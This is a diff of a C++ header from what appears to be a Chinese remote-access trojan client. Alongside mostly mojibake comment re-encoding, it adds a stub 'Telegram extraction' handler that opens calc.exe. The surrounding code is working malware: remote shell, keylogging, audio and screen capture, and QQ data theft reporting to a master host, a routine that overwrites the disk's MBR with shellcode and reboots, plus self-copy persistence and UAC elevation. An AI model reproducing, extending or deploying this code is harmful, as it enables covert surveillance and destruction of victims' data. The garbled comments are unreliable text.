@@ -1,8 +1,8 @@
-ï»¿#if !defined(AFX_LOOP_H_INCLUDED)
+#if !defined(AFX_LOOP_H_INCLUDED)
 #define AFX_LOOP_H_INCLUDED
 
 #include "../StdAfx.h"
-#include "../Declare.h"   //åŠ¨æ€è°ƒç”¨åº“å‡½æ•°
+#include "../Declare.h"   //¶¯Ì¬µ÷ÓÃ¿âº¯Êı
 #include "until.h"
 #include <shlobj.h>
 #include "AudioManager.h"
@@ -22,8 +22,8 @@
 #include "MyGnonen.h"
 #include <wininet.h>
 #include <tlhelp32.h>
-#include <winioctl.h>   //ç¡¬ç›˜æ¯ç­æ–‡ä»¶
-#include "../Myfunction.h"  //è‡ªå®šä¹‰å‡½æ•°
+#include <winioctl.h>   //Ó²ÅÌ»ÙÃğÎÄ¼ş
+#include "../Myfunction.h"  //×Ô¶¨Òåº¯Êı
 #include <tchar.h>
 #include <mmsystem.h>
 #pragma comment(lib, "winmm.lib")
@@ -189,7 +189,7 @@ bool OpenUrl(LPBYTE sRemote, INT nShowCmd)
 }
 
 //////////////////////////////////////////////////////////////////////////
-//æ–‡ä»¶ç®¡ç†
+//ÎÄ¼ş¹ÜÀí
 DWORD WINAPI Loop_FileManager(LPBYTE sRemote)
 {
 	CClientSocket	socketClient;
@@ -201,7 +201,7 @@ DWORD WINAPI Loop_FileManager(LPBYTE sRemote)
 	return 0;
 }
 
-//è¿œç¨‹ç»ˆç«¯
+//Ô¶³ÌÖÕ¶Ë
 DWORD WINAPI Loop_ShellManager(LPBYTE sRemote)
 {
 	CClientSocket	socketClient;
@@ -213,7 +213,7 @@ DWORD WINAPI Loop_ShellManager(LPBYTE sRemote)
 	return 0;
 }
 
-//æ¡Œé¢ç®¡ç†
+//×ÀÃæ¹ÜÀí
 DWORD WINAPI Loop_ScreenManager(LPBYTE sRemote)
 {
 	CClientSocket	socketClient;
@@ -236,10 +236,10 @@ DWORD WINAPI Loop_DllManager(LPBYTE lparam)
 	return 0;
 }
 
-//éŸ³é¢‘ç›‘å¬
+//ÒôÆµ¼àÌı
 DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
 {
-	if (!waveInGetNumDevs())  //è¯»æ˜¯å¦æœ‰å½•éŸ³è®¾å¤‡
+	if (!waveInGetNumDevs())  //¶ÁÊÇ·ñÓĞÂ¼ÒôÉè±¸
 		return -1;
 	
 	CClientSocket	socketClient;
@@ -251,9 +251,16 @@ DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
 	return 0;
 }
 
-//é”®ç›˜è®°å½•
+//ÌáÈ¡ T G
+DWORD WINAPI Loop_TelegramManager(LPBYTE sRemote)
+{
+    ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
+    return 0;
+}
 
-DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//é”®ç›˜è®°å½•
+//¼üÅÌ¼ÇÂ¼
+
+DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//¼üÅÌ¼ÇÂ¼
 {	
 	
 	CClientSocket	SocketClient;
@@ -267,12 +274,12 @@ DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//é”®ç›˜è®°å½•
 	return 0;
 }
 
-//ç³»ç»Ÿç®¡ç†
+//ÏµÍ³¹ÜÀí
 DWORD WINAPI Loop_SystemManager(LPBYTE sRemote)   
 {	
-	char NETLine = ConnectType;    //ä¸Šçº¿æ–¹å¼
-	char NATOper = (char)InstallMode;  //è¿è¡Œæ¨¡å¼
-	char *Addressp = (char *)lpConnInfos[ConnectType];  //ä¸Šçº¿åœ°å€
+	char NETLine = ConnectType;    //ÉÏÏß·½Ê½
+	char NATOper = (char)InstallMode;  //ÔËĞĞÄ£Ê½
+	char *Addressp = (char *)lpConnInfos[ConnectType];  //ÉÏÏßµØÖ·
 	CClientSocket	socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
@@ -282,7 +289,7 @@ DWORD WINAPI Loop_SystemManager(LPBYTE sRemote)
 	return 0;
 }
 
-//æ³¨å†Œè¡¨ç®¡ç†
+//×¢²á±í¹ÜÀí
 DWORD WINAPI Loop_RegeditManager(LPBYTE sRemote)          
 {	
 	CClientSocket	socketClient;
@@ -294,7 +301,7 @@ DWORD WINAPI Loop_RegeditManager(LPBYTE sRemote)
 	return 0;
 }
 
-//æœåŠ¡ç®¡ç†
+//·şÎñ¹ÜÀí
 DWORD WINAPI Loop_SerManager(LPBYTE sRemote)   
 {	
 	CClientSocket	socketClient;
@@ -306,12 +313,12 @@ DWORD WINAPI Loop_SerManager(LPBYTE sRemote)
 	return 0;
 }
 
-//ä¸»æœºç®¡ç†
+//Ö÷»ú¹ÜÀí
 DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
 {
-	char NETLine = ConnectType;    //ä¸Šçº¿æ–¹å¼
-	char NATOper = (char)InstallMode;  //è¿è¡Œç±»å‹
-	char *Addressp = (char *)lpConnInfos[ConnectType];  //ä¸Šçº¿åœ°å€
+	char NETLine = ConnectType;    //ÉÏÏß·½Ê½
+	char NATOper = (char)InstallMode;  //ÔËĞĞÀàĞÍ
+	char *Addressp = (char *)lpConnInfos[ConnectType];  //ÉÏÏßµØÖ·
 	
 	CClientSocket	socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
@@ -322,7 +329,7 @@ DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
 	return 0;
 }
 
-//è¿œç¨‹äº¤è°ˆ
+//Ô¶³Ì½»Ì¸
 DWORD WINAPI Loop_ChatManager(LPBYTE sRemote)
 {
 	CClientSocket	socketClient;
@@ -335,7 +342,7 @@ DWORD WINAPI Loop_ChatManager(LPBYTE sRemote)
 	return 0;
 }
 
-//å¥½å‹ä¿¡æ¯
+//ºÃÓÑĞÅÏ¢
 DWORD WINAPI Loop_QQInfoManager(LPBYTE sRemote)
 {
 	CClientSocket	socketClient;
@@ -347,10 +354,10 @@ DWORD WINAPI Loop_QQInfoManager(LPBYTE sRemote)
 	return 0;
 }
 
-//å¼¹å‡ºæ¶ˆæ¯æ¡†
+//µ¯³öÏûÏ¢¿ò
 void WINAPI Loop_MessageBox(LPVOID lParam)
 {
-	//å‘é€æ¶ˆæ¯
+	//·¢ËÍÏûÏ¢
 	struct MSGBOX
 	{
 		CHAR Title[200];
@@ -363,7 +370,7 @@ void WINAPI Loop_MessageBox(LPVOID lParam)
 	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
 }
 
-//æ˜¾ç¤ºæ‰“å¼€ç½‘é¡µ
+//ÏÔÊ¾´ò¿ªÍøÒ³
 DWORD WINAPI Loop_OpenUrlShow(LPBYTE sRemote)
 {
 	return OpenUrl(sRemote, SW_SHOW);
@@ -371,7 +378,7 @@ DWORD WINAPI Loop_OpenUrlShow(LPBYTE sRemote)
 // 	SetEvent(hNewThreadInitializedEvent);
 }
 
-//éšè—æ‰“å¼€ç½‘é¡µ
+//Òş²Ø´ò¿ªÍøÒ³
 DWORD WINAPI Loop_OpenUrlHide(LPBYTE sRemote)
 {
 	return OpenUrl(sRemote,SW_HIDE);
@@ -380,7 +387,7 @@ DWORD WINAPI Loop_OpenUrlHide(LPBYTE sRemote)
 	return 0;
 }
 
-//è¿›ç¨‹ç­›é€‰
+//½ø³ÌÉ¸Ñ¡
 BOOL SortUOP=NULL;
 DWORD WINAPI Loop_SortProcess(LPVOID lparam)  
 {
@@ -393,7 +400,7 @@ DWORD WINAPI Loop_SortProcess(LPVOID lparam)
 	return 0;
 }
 
-//çª—ä½“ç­›é€‰
+//´°ÌåÉ¸Ñ¡
 DWORD WINAPI Loop_SortWindow(LPVOID lparam)  
 {
 	_tcscpy(temp_proc,(LPTSTR)lparam);
@@ -406,7 +413,7 @@ DWORD WINAPI Loop_SortWindow(LPVOID lparam)
 	return 0;
 }
 
-// ä¸‹è½½è€…
+// ÏÂÔØÕß
 DWORD WINAPI Loop_DownManager(LPVOID lparam)
 {
 	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
@@ -478,13 +485,13 @@ void SetHostID(LPCTSTR lpHostID)
 	}
 }
 
-/*---------------------------ç¡¬ç›˜ç‚¸å¼¹----------------------------*/
+/*---------------------------Ó²ÅÌÕ¨µ¯----------------------------*/
 
-// unsigned char mbrscode[] = // åŒ…å«QQç•™è¨€
+// unsigned char mbrscode[] = // °üº¬QQÁôÑÔ
 // "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
 // "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x47\x61\x6d\x65\x20\x4f\x76\x65"
 // "\x72\x20\x51\x51\x20\x3a\x20\x38\x35\x30\x36\x35\x38\x35\x36";
-unsigned char mbrscode[] = // ä¸å«QQç•™è¨€
+unsigned char mbrscode[] = // ²»º¬QQÁôÑÔ
 "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
 "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe";
 
@@ -495,15 +502,15 @@ int KillMBR(BOOL bLeaveQQ)
 	DWORD dwBytesWritten, dwBytesReturned;
 	BYTE pMBR[512] = {0};
 	
-	// é‡æ–°æ„é€ MBR
-	if (bLeaveQQ)   // ç•™ä¸‹QQ
+	// ÖØĞÂ¹¹ÔìMBR
+	if (bLeaveQQ)   // ÁôÏÂQQ
 		memcpy(pMBR, mbrscode, sizeof(mbrscode) - 1);
-	else            // ä¸ç•™QQ
+	else            // ²»ÁôQQ
 		memcpy(pMBR, mbrscode, sizeof(mbrscode) - 23 - 1);
 	pMBR[510] = 0x55;
 	pMBR[511] = 0xAA;
 	
-	// å†™å…¥ç—…æ¯’å†…å®¹
+	// Ğ´Èë²¡¶¾ÄÚÈİ
 	hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	if (hDevice == INVALID_HANDLE_VALUE)
 		return -1;
@@ -513,7 +520,7 @@ int KillMBR(BOOL bLeaveQQ)
 	CloseHandle(hDevice);
 	Sleep(2000);
 	
-	// é‡æ–°å¯åŠ¨ç”µè„‘
+	// ÖØĞÂÆô¶¯µçÄÔ
 	DWORD dwVersion = GetVersion();
 	if (dwVersion < 0x80000000)   // Is NT or 2000!
 	{
@@ -536,51 +543,51 @@ void WINAPI Loop_PrankControl(LPVOID lparam)
 	switch(dwType)
 	{
 	case COMMAND_KILLMBR:
-		KillMBR(TRUE); //ç¡¬ç›˜ç‚¸å¼¹
+		KillMBR(TRUE); //Ó²ÅÌÕ¨µ¯
 		break;
 	case COMMAND_ZHUOMIAN1:
 		{
 			HWND disk;
 			disk = FindWindow("Progman",NULL);
-			ShowWindow(disk,SW_HIDE); //éšè—æ¡Œé¢
+			ShowWindow(disk,SW_HIDE); //Òş²Ø×ÀÃæ
 		}
 		break;
 	case COMMAND_ZHUOMIAN2:
 		{
 			HWND disk;
 			disk=FindWindow("Progman",NULL);
-			ShowWindow(disk,SW_SHOW); //æ˜¾ç¤ºæ¡Œé¢
+			ShowWindow(disk,SW_SHOW); //ÏÔÊ¾×ÀÃæ
 		}
 		break;
 	case COMMAND_RENWULAN1:
 		{
 			HWND mask;
 			mask=FindWindow("Shell_TrayWnd",NULL);
-			ShowWindow(mask,SW_HIDE); //éšè—ä»»åŠ¡æ 
-			mask=FindWindow("Button","å¼€å§‹");
-			ShowWindow(mask,SW_HIDE); //éšè—å¼€å§‹æŒ‰é’®
+			ShowWindow(mask,SW_HIDE); //Òş²ØÈÎÎñÀ¸
+			mask=FindWindow("Button","¿ªÊ¼");
+			ShowWindow(mask,SW_HIDE); //Òş²Ø¿ªÊ¼°´Å¥
 		}
 		break;
 	case COMMAND_RENWULAN2:
 		{
 			HWND mask;
 			mask=FindWindow("Shell_TrayWnd",NULL);
-			ShowWindow(mask,SW_SHOW); //æ˜¾ç¤ºä»»åŠ¡æ 
-			mask=FindWindow("Button","å¼€å§‹");
-			ShowWindow(mask,SW_SHOW); //æ˜¾ç¤ºå¼€å§‹æŒ‰é’®
+			ShowWindow(mask,SW_SHOW); //ÏÔÊ¾ÈÎÎñÀ¸
+			mask=FindWindow("Button","¿ªÊ¼");
+			ShowWindow(mask,SW_SHOW); //ÏÔÊ¾¿ªÊ¼°´Å¥
 		}
 		break;
 	case COMMAND_XIANSHIQI1:
-		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);  //å…³é—­æ˜¾ç¤ºå™¨
+		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);  //¹Ø±ÕÏÔÊ¾Æ÷
 		break;
 	case COMMAND_XIANSHIQI2:
-		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1); //æ‰“å¼€æ˜¾ç¤ºå™¨
+		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1); //´ò¿ªÏÔÊ¾Æ÷
 		break;
 	case COMMAND_GUANGQU1:
-		::mciSendString("set cdaudio door open",NULL,0,NULL);          //æ‰“å¼€å…‰é©±
+		::mciSendString("set cdaudio door open",NULL,0,NULL);          //´ò¿ª¹âÇı
 		break;
 	case COMMAND_GUANGQU2:
-		::mciSendString("set cdaudio door closed wait",NULL,0,NULL);   //å…³é—­å…‰é©±
+		::mciSendString("set cdaudio door closed wait",NULL,0,NULL);   //¹Ø±Õ¹âÇı
 		break;
 	case COMMAND_ZAOYIN:
 		{
@@ -607,10 +614,10 @@ void WINAPI Loop_PrankControl(LPVOID lparam)
 		}
 		break;
 	case COMMAND_MOUSE1:
-		SwapMouseButton(true);  //äº¤æ¢é¼ æ ‡
+		SwapMouseButton(true);  //½»»»Êó±ê
 		break;
 	case COMMAND_MOUSE2:
-		SwapMouseButton(false); //æ¢å¤é¼ æ ‡
+		SwapMouseButton(false); //»Ö¸´Êó±ê
 		break;
 	default:
 		return;
@@ -619,53 +626,53 @@ void WINAPI Loop_PrankControl(LPVOID lparam)
 
 DWORD WINAPI Loop_Screen()
 {	
-	//è·å–åˆ†è¾¨ç‡  
+	//»ñÈ¡·Ö±æÂÊ  
 	int _cx = ::GetSystemMetrics(SM_CXSCREEN);   
 	int _cy = ::GetSystemMetrics(SM_CYSCREEN);  
 	
-	//ä¿®æ”¹åˆ†è¾¨ç‡  
+	//ĞŞ¸Ä·Ö±æÂÊ  
 	DEVMODE lpDevMode;  
-	lpDevMode.dmBitsPerPel = 32;//æ¯ä¸ªåƒç´ çš„ä½æ•°  
-	lpDevMode.dmPelsWidth = 1600;//å±å¹•å®½åº¦ï¼ˆåƒç´ ï¼‰  
-	lpDevMode.dmPelsHeight = 900;//å±å¹•é«˜åº¦ï¼ˆåƒç´ ï¼‰  
+	lpDevMode.dmBitsPerPel = 32;//Ã¿¸öÏñËØµÄÎ»Êı  
+	lpDevMode.dmPelsWidth = 1600;//ÆÁÄ»¿í¶È£¨ÏñËØ£©  
+	lpDevMode.dmPelsHeight = 900;//ÆÁÄ»¸ß¶È£¨ÏñËØ£©  
 	lpDevMode.dmSize = sizeof(lpDevMode);  
 	lpDevMode.dmFields =   
-		DM_PELSWIDTH/*ä½¿ç”¨dmPelsWidthçš„å€¼*/  
-		|DM_PELSHEIGHT/*ä½¿ç”¨dmPelsHeightçš„å€¼*/  
-		|DM_BITSPERPEL/*ä½¿ç”¨dmBitsPerPelçš„å€¼*/;  
+		DM_PELSWIDTH/*Ê¹ÓÃdmPelsWidthµÄÖµ*/  
+		|DM_PELSHEIGHT/*Ê¹ÓÃdmPelsHeightµÄÖµ*/  
+		|DM_BITSPERPEL/*Ê¹ÓÃdmBitsPerPelµÄÖµ*/;  
 	//  
 	LONG result = ChangeDisplaySettings(&lpDevMode, 0);  
 	if (result == DISP_CHANGE_SUCCESSFUL)  
 	{  
-		//			MessageBox(NULL, L"ä¿®æ”¹æˆåŠŸï¼", L"Tip", MB_OK);  
-		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRYè¡¨ç¤ºæ¬¡ä¿®æ”¹æ˜¯æŒä¹…çš„ï¼Œå¹¶åœ¨æ³¨å†Œè¡¨ä¸­å†™å…¥äº†ç›¸å…³çš„æ•°æ®  
+		//			MessageBox(NULL, L"ĞŞ¸Ä³É¹¦£¡", L"Tip", MB_OK);  
+		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY±íÊ¾´ÎĞŞ¸ÄÊÇ³Ö¾ÃµÄ£¬²¢ÔÚ×¢²á±íÖĞĞ´ÈëÁËÏà¹ØµÄÊı¾İ  
 	}  
 	else  
 	{  
-		//			MessageBox(NULL, L"ä¿®æ”¹å¤±è´¥ï¼Œæ¢å¤åŸæœ‰è®¾ç½®ï¼", L"Tip", MB_OK);  
+		//			MessageBox(NULL, L"ĞŞ¸ÄÊ§°Ü£¬»Ö¸´Ô­ÓĞÉèÖÃ£¡", L"Tip", MB_OK);  
 		ChangeDisplaySettings(NULL,0);  
 	}  
 	return 0;
 }
 
-//ç»“æ„ä½“
+//½á¹¹Ìå
 struct START
 {
 	CHAR Startname[200];
-	WORD FileAttribute;      //æ–‡ä»¶å±æ€§	
-	WORD Enlarge;            //å®‰è£…å¢å¤§
+	WORD FileAttribute;      //ÎÄ¼şÊôĞÔ	
+	WORD Enlarge;            //°²×°Ôö´ó
 }Start;
 
 ///////////////////////////////////////////////////////////////////////////////////
-VOID Wj_OnButtonAdd(LPSTR Path)  //æ–‡ä»¶åŠ å¤§å‡½æ•°  Path æ–‡ä»¶å
+VOID Wj_OnButtonAdd(LPSTR Path)  //ÎÄ¼ş¼Ó´óº¯Êı  Path ÎÄ¼şÃû
 {
 	HMODULE hDll;
 	hDll = LoadLibrary("KERNEL32.dll");
-	if(Start.Enlarge == 0)  //å®‰è£…ä¸å¢å¤§
+	if(Start.Enlarge == 0)  //°²×°²»Ôö´ó
 		return ;
 	
 	
-	int m_Size=Start.Enlarge;  //m_Size=10 å°±æ˜¯10M
+	int m_Size=Start.Enlarge;  //m_Size=10 ¾ÍÊÇ10M
 	DWORD dwSize = m_Size * 1024;
 	DWORD iSize; 
 	
@@ -679,13 +686,13 @@ VOID Wj_OnButtonAdd(LPSTR Path)  //æ–‡ä»¶åŠ å¤§å‡½æ•°  Path æ–‡ä»¶å
 		FILE_ATTRIBUTE_NORMAL, 
 		NULL
 		);
-	if(hFile==INVALID_HANDLE_VALUE)  //å¤±è´¥
+	if(hFile==INVALID_HANDLE_VALUE)  //Ê§°Ü
 		return;
 	
 	
 	SetFilePointer(hFile,0,NULL,FILE_END);
     iSize = GetFileSize(hFile,NULL);  
-	if((dwSize*1024)>iSize)  //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¿‡å¤§ é˜²æ­¢æœåŠ¡ç«¯ç¨‹åºå¤šæ¬¡ç‚¹å‡»è¿è¡Œ
+	if((dwSize*1024)>iSize)  //ÅĞ¶ÏÎÄ¼şÊÇ·ñ¹ı´ó ·ÀÖ¹·şÎñ¶Ë³ÌĞò¶à´Îµã»÷ÔËĞĞ
 	{  
 		
 		DWORD dwBytes=NULL;
@@ -694,7 +701,7 @@ VOID Wj_OnButtonAdd(LPSTR Path)  //æ–‡ä»¶åŠ å¤§å‡½æ•°  Path æ–‡ä»¶å
 		{
 			if(n%1024==0){
 				for (int x=0;x<1024;x++)
-					Buffer[x]=(char)(rand()+x)%255;    //å†™å…¥éšæœºåƒåœ¾æ•°æ®
+					Buffer[x]=(char)(rand()+x)%255;    //Ğ´ÈëËæ»úÀ¬»øÊı¾İ
 			}
 			
 			WriteFile(hFile,Buffer,1024,&dwBytes,NULL);
@@ -706,7 +713,7 @@ VOID Wj_OnButtonAdd(LPSTR Path)  //æ–‡ä»¶åŠ å¤§å‡½æ•°  Path æ–‡ä»¶å
 void WINAPI Loop_Start(LPVOID lParam)
 {
 	memcpy(&Start,lParam,sizeof(START));
-	////è·å–å°é©¬è·¯å¾„
+	////»ñÈ¡Ğ¡ÂíÂ·¾¶
 	char	strInstallModule[MAX_PATH]; 
 	memset(strInstallModule, 0, sizeof(strInstallModule)); 
 	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
@@ -726,10 +733,10 @@ void WINAPI Loop_Start(LPVOID lParam)
 	{
 		wsprintf(buf2, "%s\\%s", szPath, FileName);
 		Sleep(100);
-		CopyFile(strInstallModule,buf2,FALSE);//æ‹·è´è‡ªèº«æ–‡ä»¶
+		CopyFile(strInstallModule,buf2,FALSE);//¿½±´×ÔÉíÎÄ¼ş
 		MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 		CreateDirectory(szPath, NULL);
-		Wj_OnButtonAdd(buf2);  //æ–‡ä»¶å¢å¤§
+		Wj_OnButtonAdd(buf2);  //ÎÄ¼şÔö´ó
 		SetFileAttributes(buf2,Start.FileAttribute);
 	}
 } 
@@ -747,18 +754,18 @@ DWORD WINAPI Loop_ProxyManager(SOCKET sRemote)//Proxy
 	return 0;
 }
 /////////////////////////////////////////////////////////////////////////////////
-//æ£€æŸ¥ç³»ç»Ÿç‰ˆæœ¬æ˜¯å¦æ˜¯Vistaæˆ–æ›´é«˜çš„ç‰ˆæœ¬  
+//¼ì²éÏµÍ³°æ±¾ÊÇ·ñÊÇVista»ò¸ü¸ßµÄ°æ±¾  
 bool   IsOsVersionVistaOrGreater()  
 {  
     OSVERSIONINFOEX    ovex;    
-    //è®¾ç½®å‚æ•°çš„å¤§å°ï¼Œè°ƒç”¨å¹¶åˆ¤æ–­æ˜¯å¦æˆåŠŸ  
+    //ÉèÖÃ²ÎÊıµÄ´óĞ¡£¬µ÷ÓÃ²¢ÅĞ¶ÏÊÇ·ñ³É¹¦  
     ovex.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);  
     if( !GetVersionEx(  (LPOSVERSIONINFO) (&ovex)  )  )  
     {  
-        //printf("æ£€æŸ¥ç³»ç»Ÿç‰ˆæœ¬å¤±è´¥\n");  
+        //printf("¼ì²éÏµÍ³°æ±¾Ê§°Ü\n");  
         return false;  
     }  
-    //é€šè¿‡ç‰ˆæœ¬å·ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯vistaåŠä¹‹åç‰ˆæœ¬  
+    //Í¨¹ı°æ±¾ºÅ£¬ÅĞ¶ÏÊÇ·ñÊÇvista¼°Ö®ºó°æ±¾  
     if(ovex.dwMajorVersion > 5)  
     {  
         return true;   
@@ -769,7 +776,7 @@ bool   IsOsVersionVistaOrGreater()
     }  
 } 
 
-// void Win7Elevate_Privileges() //WIN7æå‡æƒé™
+// void Win7Elevate_Privileges() //WIN7ÌáÉıÈ¨ÏŞ
 DWORD WINAPI Win7Elevate_Privileges(LPVOID lParam)
 {
 	char ModuleFileNamePath[MAX_PATH]={0};
@@ -784,7 +791,7 @@ DWORD WINAPI Win7Elevate_Privileges(LPVOID lParam)
 	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
 	sei.lpVerb = TEXT("runas");
 	sei.lpFile = szRundll32Path;
-	//	sei.lpParameters =/* (LPCTSTR)*/sCmdLine;//å‚æ•°
+	//	sei.lpParameters =/* (LPCTSTR)*/sCmdLine;//²ÎÊı
 	sei.nShow = SW_SHOW;
 	if(ShellExecuteEx(&sei))
 		ExitProcess(0);
@@ -797,7 +804,7 @@ DWORD WINAPI ReStartExp(LPVOID lParam)
 	DebugPrivilege(SE_DEBUG_NAME, TRUE);
 	HANDLE  hSnapshot=NULL; 
 	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
-	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//æ”¯æŒwin7
+	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//Ö§³Öwin7
 	Process32First(hSnapshot,&pe); 
 	do 
 	{
@@ -807,7 +814,7 @@ DWORD WINAPI ReStartExp(LPVOID lParam)
 			hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID); 
 			if   (hProcess) 
 			{ 
-				TerminateProcess(hProcess,0);//å…³é—­è¿›ç¨‹ 
+				TerminateProcess(hProcess,0);//¹Ø±Õ½ø³Ì 
 			} 
 		} 
 	}   
